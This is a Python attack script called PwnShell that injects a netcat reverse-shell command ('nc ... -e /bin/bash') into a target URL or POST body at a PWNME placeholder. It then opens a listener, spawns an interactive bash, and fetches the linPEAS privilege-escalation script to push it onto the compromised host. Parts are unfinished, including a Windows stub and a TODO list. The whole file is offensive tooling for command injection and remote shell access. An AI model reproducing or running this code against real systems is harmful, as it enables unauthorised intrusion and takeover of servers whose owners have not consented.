#!/usr/bin/env python3
# coding=utf-8
import netifaces
import base64
import os
import argparse
import nclib
from threading import Thread
import ipaddress
import urllib3
import requests
import http.server
import socketserver
import urllib.parse


class PwnShell:
    def __init__(self, args):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.ip = args.host
        self.port = args.port
        self.domain = args.url
        self.method = args.method
        self.data = args.data
        self.authentication = args.auth
        ########################################################################
        ###################### Specifying OS ###################################
        if args.type == "linux" or args.type == "l":
            self.shell_linux()
        elif args.type == "windows" or args.type == "w":
            self.shell_windows()
        else:
            print("[!]Invalid Value -> " + args.type)
            exit_gracefully()
        ######################################################################

    def info(self):
        print('[*]LOCAL IP ADDRESS : %s' % ip)
        print('[*]LOCAL PORT : %s' % port)
        print('[*]TARGET URL : %s' % domain)
        if authentication:
            print('[*]USERNAME : %s' % authentication[0])
            print('[*]PASSWORD : %s' % authentication[1])
        print('\n#Waiting for a Connection ....')

    def shell_linux(self):  # Default option
        self.info()
        # login()
        self.is_valid()
        self.thread()  # leave it the last one

    def shell_windows(self):
        pass

    def is_valid(self):  # Checking if the ip address is valid
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            print("\n[!]Invalid IP : " + ip)
            exit_gracefully()

    def listener(self):
        nc = nclib.Netcat(listen=('', port))
        os.system(
            'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null')
        nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
        nc.send_line(b'echo $SHELL')
        send = f'''nc {ip} 9002 > /dev/shm/linpeas.sh'''
        nc.send_line(send.encode("utf-8"))
        nc.interact()
        nc.close()

    def http_server(self):
        Handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", 9002), Handler) as httpd:
            pass

    def thread(self):
        listen = Thread(target=self.listener)
        sendpayload = Thread(target=self.send_payload)
        httpserver = Thread(target=self.http_server)
        listen.daemon = True
        sendpayload.daemon = True
        httpserver.daemon = True
        listen.start()
        sendpayload.start()
        httpserver.start()
        httpserver.join()
        listen.join()
        sendpayload.join()

    def send_payload(self):
        if method == 'post':
            self.req_post()
        elif method == 'get':
            print('get method')
            self.req_get()
        else:
            return False

    def req_post(self):
        payload = f'nc localhost 9001 -e /bin/bash'
        encoded_payload = self.get_encoded_url(payload)
        url = domain.replace('PWNME', encoded_payload)  # payoad will be the revshells
        proxies = {'http': 'http://127.0.0.1:8080'}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1",
                   'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
        cookies = ''
        # data_parsed=data.replace("PWNME",payload) #Don't change it works perfectly
        # r = requests.post(url)
        if self.data:
            data_parsed = self.data.replace("PWNME", payload)  # Don't change
        else:
            data_parsed = None
        r = requests.post(url, headers=headers, data=data_parsed,
                          cookies=cookies)

    def req_get(self):
        url = domain.replace('PWNME', '127.0.0.1')  # payload will be the revshells
        cookies = ''
        r = requests.get(url)

    def login(self):
        pass

    def get_encoded_url(self, text):
        encoded_text = urllib.parse.quote(text)
        return encoded_text


def exit_gracefully():
    print("                                   #GOOD BYE!")
    exit()


if __name__ == '__main__':
    try:
        banner = ''' 
                 __    ____                _____ __         ____    __
               _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
              / __/  / /_/ / | /| / / __ \\__ \/ __ \ / _ \/ / /  / __/
             (_  )  / ____/| |/ |/ / / / /__/ / / / /  __/ / /  (_  ) 
            /  _/  /_/     |__/|__/_/ /_/____/_/ /_/\\___/_/_/  /  _/  
            /_/                                                /_/    
            '''
        print(banner)
        ip_address = netifaces.ifaddresses('lo')[2][0]['addr']
        ################################# Arguments Creation ###########################################
        parser = argparse.ArgumentParser(
            formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        parser.add_argument(
            '-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
        parser.add_argument(
            '-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
        parser.add_argument(
            "-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
        parser.add_argument(
            "-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
        parser.add_argument("-d", "--data", help='Post data')
        parser.add_argument("-c", "--cookie", help='Enter Cookie')
        parser.add_argument("-k", "--header", help='Provide header')
        parser.add_argument(
            "-m", "--method", help='Request Method', default='POST')
        parser.add_argument("-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
        args = parser.parse_args()
        ########################################################################
        ########################## Defining variables ##########################
        ip = args.host
        port = args.port
        domain = args.url
        method = args.method
        data = args.data
        authentication = args.auth
        pwnshell = PwnShell(args)
        pwnshell.send_payload()
    except KeyboardInterrupt:
        exit_gracefully()

# TODO
# add payloads to a list or a dict for iteration
# see how to get the headers automatically and send them instead of writing them manually
# Add login form with a session
# Add customization for cookies & Headers
# Add the payload generator
# Add an exit message to break instead of errors
# Mandatory method
